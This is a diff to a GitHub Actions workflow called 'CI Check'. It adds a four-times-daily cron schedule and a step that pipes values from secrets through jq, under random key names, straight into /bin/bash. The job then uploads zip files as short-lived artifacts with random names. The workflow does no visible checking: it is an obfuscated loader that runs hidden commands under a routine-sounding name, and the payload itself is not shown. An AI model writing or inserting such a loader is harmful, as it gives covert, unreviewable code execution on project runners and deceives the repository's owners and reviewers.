@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '58 1,7,13,19 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -13,16 +15,14 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          er2: ${{ secrets.er2 }}
+          v65: ${{ secrets.v65 }}
         run: |
-          printf '%s' "$er2" | jq -r .yda5265 | /bin/bash
-          printf '%s' "$gy02" | jq -r .hgg34045 | /bin/bash
-          printf '%s' "$h83" | jq -r .bsnvm593 | /bin/bash
-          printf '%s' "$bt864" | jq -r .ly48 | /bin/bash
+          printf '%s' "$v65" | jq -r .cjlay6 | /bin/bash
+          echo $ttnt25271 | jq -r .h90 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: DU0flbtM
+          name: 1WEWqS5C
           path: "*.zip"
           retention-days: 1
